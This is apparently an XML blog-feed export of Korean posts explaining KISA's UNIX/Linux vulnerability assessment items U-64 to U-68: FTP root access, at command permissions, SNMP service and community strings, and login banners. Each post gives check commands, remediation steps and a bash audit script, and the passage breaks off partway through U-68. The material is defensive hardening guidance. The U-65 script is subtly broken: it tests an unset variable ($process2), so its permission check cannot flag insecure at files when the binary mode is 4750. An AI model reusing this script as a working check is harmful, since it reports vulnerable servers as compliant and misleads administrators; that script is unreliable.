<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>root의 <code>FTP</code> 직접 접속을 방지하여 root 패스워드 정보를 노출되지 않도록 하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>FTP</code> 서비느는 아이디 및 패스워드가 암호화되지 않은 상태로 전송되어 스니핑에 의해서 관리자 계정의 아이디 및 패스워드가 노출될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>FTP</code> 서비스가 비활성화 되어 있거나 활성화 시 root 계정 접속을 차단한 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>FTP</code> 서비스가 활성화 되어 있고 root 계정 접속을 허용한 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>아래 파일에서 <code>FTP</code>에 대한 root 계정으로의 접속 가능 여부 확인<br />    <code># cat /etc/ftpusers</code><br />    <code># cat /etc/ftpd/ftpusers</code><br />    #root 또는 root 계정 미등록</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/vsftpd/ftpusers | grep -v &quot;#&quot; | grep &quot;root&quot;</p>
</blockquote>
<br>

<p><code>ftpusers</code> 파일에 root 계정이 포함되어있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-64/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>ftpusers</code> 파일 열기<br />    <code># vi /etc/ftpusers</code><br /><br />2) <code>ftpusers</code> 파일에 root 계정 추가 또는 주석제거</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ps -ef | grep <span class="string">&quot;ftp&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        process=`find / -name ftpusers`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                process2=`cat <span class="string">&quot;<span class="variable">$process</span>&quot;</span> | grep -v <span class="string">&quot;#&quot;</span> | grep <span class="string">&quot;root&quot;</span>`</span><br><span class="line">                <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line">                <span class="keyword">then</span></span><br><span class="line">                        ProcessResult=양호</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                        ProcessResult=취약</span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                ProcessResult=<span class="string">&quot;파일 없음&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-64 [ftpusers 파일 설정\(FTP 서비스 root 계정 접근제한\)] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-64.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>FTP</code> 서비스가 비활성화 상태이거나 root 계정 접속을 차단한 경우 <code>양호</code>, 아니면 <code>취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-64</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-64/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-65 at 서비스 권한 설정</title>
    <url>/2022/01/24/2022-01-24-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-65%20at%20%EC%84%9C%EB%B9%84%EC%8A%A4%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>관리자만 <code>at.allow</code> 파일과 <code>at.deny</code> 파일을 제어할 수 있는지 점검합니다.</p>
<p>항목코드는 <code>U-65</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>관리자 외 <code>at</code> 서비스를 사용할 수 없도록 설정하고 있는지 점검하는 것을 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>root 외 일반사용자에게도 <code>at</code> 명령어를 사용할 수 있도록 할 경우 고의 또는 실수록 불법적인 예약 파일 실행으로 시스템 피해를 일으킬 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>at</code> 명령어 일반사용자 금지 및 <code>at</code> 관련 파일 640 이하인 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>at</code> 명령어 일반사용자가 사용가능하거나 <code>at</code> 관련 파일 640 이상인 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><code>/etc/cron.d/</code></td>
</tr>
<tr>
<td>LINUX</td>
<td><code>/etc/</code></td>
</tr>
<tr>
<td>AIX, HP-UX</td>
<td><code>/var/adm/cron/</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls -al /etc/at.*</p>
</blockquote>
<br>

<p><code>at</code> 관련 파일 권한을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-65/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) <code>at</code> 명령어 일반사용자 권한 삭제<br />    <code># ls -l /usr/bin/at</code><br />    <code># chmod 4750 /usr/bin/at</code><br /><br />2) <code>cron</code> 관련 설정파일 소유자 및 권한 설정<br />    <code># chown root &lt;at 관련 파일&gt;</code><br />    <code># chmod 640 &lt;at 관련 파일&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ls -l /usr/bin/at`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        process=`find /usr/bin/at -perm 4750`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                process=`find /etc/at.* -perm -641`</span><br><span class="line">                <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line">                <span class="keyword">then</span></span><br><span class="line">                        ProcessResult=취약</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                        ProcessResult=양호</span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                ProcessResult=취약</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-65 [at 서비스 권한 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-65.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>at</code> 명령어 일반사용자 권한을 삭제하거나 <code>at</code> 관련 파일 권한이 640 이하인 경우 <code>양호</code>, 아니면 <code>취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-65</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-65/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-66 SNMP 서비스 구동 점검</title>
    <url>/2022/01/24/2022-01-24-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-66%20SNMP%20%EC%84%9C%EB%B9%84%EC%8A%A4%20%EA%B5%AC%EB%8F%99%20%EC%A0%90%EA%B2%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>SNMP</code> 서비스 활성화 여부 점검입니다.</p>
<p>항목코드는 <code>U-66</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>불필요한 <code>SNMP</code> 서비스 활성화로 인해 필요 이상의 정보가 노출되는 것을 막기 위해 <code>SNMP</code> 서비스를 중지해야합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>SNMP</code> 서비스로 인하여 시스템의 주요 정보 유출 및 정보의 불법수정이 발생할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>SNMP</code> 서비스를 사용하지 않는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>SNMP</code> 서비스를 사용하는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><code># ps -ef | grep snmp</code> 또는 <code># svcs -a | grep snmp</code></td>
</tr>
<tr>
<td>LINUX, AIX,<br />HP-UX</td>
<td><code># ps -ef | grep snmp</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ps -ef | grep snmp | grep -v &quot;grep&quot;</p>
</blockquote>
<br>

<p><code>SNMP</code> 서비스가 활성화되어있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-66/ps.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS 5.9 이하</td>
<td>1) <code># ps -ef | grep snmp</code>로 검색하여 위치 확인 후 이름 변경<br /><br />2) <code># /etc/init.d/init.snmpdx stop</code><br /><br />3) <code># mv /etc/rc3.d/S76snmpdx /etc/rc3.d/_S76snmpdx</code> (rc*/_S**snmpdx 의 *수치는 각각 다름)</td>
</tr>
<tr>
<td>SOLARIS 5.10</td>
<td>1) <code># svcs -a | grep snmp</code> 명령으로 데몬 확인<br /><br />2) 데몬 활성화 확인<br />    <code># ps -ef | grep snmp</code> 또는 <code># svcs -a | grep snmp</code><br /><br />3) <code># svcadm disable</code> 명령으로 데몬 중지</td>
</tr>
<tr>
<td>LINUX, AIX,<br />HP-UX</td>
<td>1) <code># ps -ef | grep snmp</code>로 검색<br /><br />2) <code>SNMP</code> 사용하지 않을 시 서비스 중지<br /><br />&lt;LINUX&gt;<br />    <code># service snmpd stop</code><br /><br />&lt;AIX&gt;<br />    1) <code># kill -9 [PID]</code><br />    2) <code># vi /etc/rc.tcpip</code> 실행하여 다음 라인 주석처리<br /><br />&lt;HP-UX&gt;<br />    1) <code># kill -9 [PID]</code> 또는 <code>/sbin/SnmpAgtStart.d/S560SnmpMaster stop</code><br />    2) <code># mv /sbin/SnmpAgtStart.d/S560SnmpMaster/sbin/SnmpAgtStart.d/_S560SnmpMaster</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ps -ef | grep snmp | grep -v <span class="string">&quot;grep&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-66 [SNMP 서비스 구동 점검] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-66.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>SNMP</code> 서비스를 사용하지 않는 경우 <code>양호</code>, 아니면 <code>취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-66</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-66/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-67 SNMP 서비스 Community String의 복잡성 설정</title>
    <url>/2022/01/25/2022-01-25-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-67%20SNMP%20%EC%84%9C%EB%B9%84%EC%8A%A4%20Community%20String%EC%9D%98%20%EB%B3%B5%EC%9E%A1%EC%84%B1%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>SNMP Community String</code> 복잡성 설정 여부 점검입니다.</p>
<p>항목코드는 <code>U-67</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>Community String 기본 설정인 Public, Private는 공개된 내용으로 공격자가 이를 이용하여 <code>SNMP</code> 서비스를 통해 시스템 정보를 얻을 수 있기 때문에 Community String을 유추하지 못하도록 설정해야합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>Community String은 Default로 public, private로 설정된 경우가 많으며 이를 변경하지 않으면 이 String을 악용하여 환경설정 파일 열람 및 수정을 통한 공격, 간단한 정보수집에서부터 관리자 권한 획득 및 Dos공격까지 다양한 형태의 공격이 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>SNMP Community</code> 이름이 public, private 이 아닌 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>SNMP Community</code> 이름이 public, private 인 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS<br />9 이하 버전</td>
<td><code># vi /etc/snmpconf/snmpdconf</code><br />    read-community public / write-community private</td>
</tr>
<tr>
<td>SOLARIS<br />10 이상 버전</td>
<td><code># vi /etc/sma/snmp/snmpd.conf</code><br />    rocommunity public / rwcommunity private</td>
</tr>
<tr>
<td>LINUX</td>
<td><code># vi /etc/snmp/snmpd.conf</code><br />    com2sec notConfigUser default public</td>
</tr>
<tr>
<td>AIX</td>
<td><code># vi /etc/snmpdv3.conf</code><br />    COMMUNITY public public noAuthNoPriv 0.0.0.0 0.0.0 -</td>
</tr>
<tr>
<td>HP-UX</td>
<td><code># vi /etc/snmpd.conf</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/snmp/snmpd.conf | grep “public” | grep -v “#”</p>
</blockquote>
<br>

<p><code>SNMP Community</code> 이름이 <code>public</code>인지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-67/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td>1) vi 편집기를 이용하여 <code>SNMP</code> 설정파일 열기<br /><br />2) Community String 값 설정 변경<br /><strong>&lt; SOLARIS 9 이하 버전 &gt;</strong><br /><code># vi /etc/snmp/conf/snmpd.conf</code><br />(수정 전) read-community public / write-community private<br />(수정 후) read-community &lt;변경 값&gt; / write-community &lt;변경 값&gt;<br /><br /><strong>&lt; SOLARIS 10 이상 버전 &gt;</strong><br /><code># vi /etc/sma/snmp/snmpd.conf</code><br />(수정 전) rocommunity public / rwcommunity private<br />(수정 후) rocommunity &lt;변경 값&gt; / rwcommunity &lt;변경 값&gt;<br /><br /><strong>&lt; SOLARIS 9 이하 버전 &gt;</strong><br /><code># ps -ef | grep snmp</code><br /><code># kill -HUP [PID]</code><br /><br /><strong>&lt; SOLARIS 10 이상 버전 &gt;</strong><br /><code># svcs -a | grep snmpdx</code><br /><code># svcadm disable svc:/application/management/snmpdx:default</code><br /><code># svcadm enable svc:/application/management/snmpdx:default</code></td>
</tr>
<tr>
<td>LINUX</td>
<td>1) vi 편집기를 이용하여 <code>SNMP</code> 설정파일 열기<br />    <code># vi /etc/snmp/snmpd.conf</code><br /><br />2) Community String 값 설정 변경 (추측하기 어려운 값으로 설정)<br />    (수정 전) com2sec notConfigUser default public<br />    (수정 후) com2sec notConfigUser default &lt;변경 값&gt;<br /><br />3) 서비스 재구동<br />    <code># service snmpd restart</code></td>
</tr>
<tr>
<td>AIX</td>
<td>1) vi 편집기를 이용하여 <code>SNMP</code> 설정파일 열기<br />    <code># vi /etc/snmpv3.conf</code><br /><br />2) Community String 값 설정 변경 (추측하기 어려운 값으로 설정)<br />    (수정 전) COMMUNITY public public noAuthNoPriv 0.0.0.0 0.0.0 -<br />    (수정 후) COMMUNITY &lt;변경 값&gt; &lt;변경 값&gt; noAuthNoPriv 0.0.0.0 0.0.0 -<br /><br />3) 서비스 재구동<br />    <code># ps -ef | grep snmp</code><br />    <code># kill -HUP [PID]</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>SNMP</code> 설정파일 열기<br />    <code># vi /etc/snmpd.conf</code><br /><br />2) Community String 값 설정 변경 (추측하기 어려운 값으로 설정)<br />    (수정 전) get-community-name: public / set-commnunity-name : private<br />    (수정 후) get-community-name: &lt;변경 값&gt; / set-commnunity-name: &lt;변경 값&gt;<br /><br />3) 서비스 재구동<br />    <code># ps -ef |grep snmp</code><br />    <code># kill -HUP [PID]</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/snmp/snmpd.conf | grep com2sec | grep -v <span class="string">&quot;#&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;public&quot;</span>* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-67 [SNMP 서비스 Community String의 복잡성 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-67.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>SNMP Community</code> 이름이 <code>public</code>이 아닌 경우 <code>양호</code>, 아니면 <code>취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-67</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-67/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-68 로그온 시 경고 메시지 제공</title>
    <url>/2022/01/25/2022-01-25-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-68%20%EB%A1%9C%EA%B7%B8%EC%98%A8%20%EC%8B%9C%20%EA%B2%BD%EA%B3%A0%20%EB%A9%94%EC%8B%9C%EC%A7%80%20%EC%A0%9C%EA%B3%B5/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>서버 및 서비스에 로그온 시 불필요한 정보 차단 설정 및 불법적인 사용에 대한 경고 메시지 출력 여부 점검입니다.</p>
<p>항목코드는 <code>U-68</code>이며, 항목 주요도는 <code>하</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>비인가자들에게 서버에 대한 불필요한 정보를 제공하지 않고 서버 접속 시 관계자만 접속해야 한다는 경각심을 심어 주기위해 경고 메시지 설정이 필요합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>로그인 배너가 설정되지 않을 경우 배너에 서버 OS 버전 및 서비스 버전이 공격자에게 노출될 수 있으며 공격자는 이러한 정보를 통하여 해당 OS 및 서비스의 취약점을 이용하여 공격을 시도할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

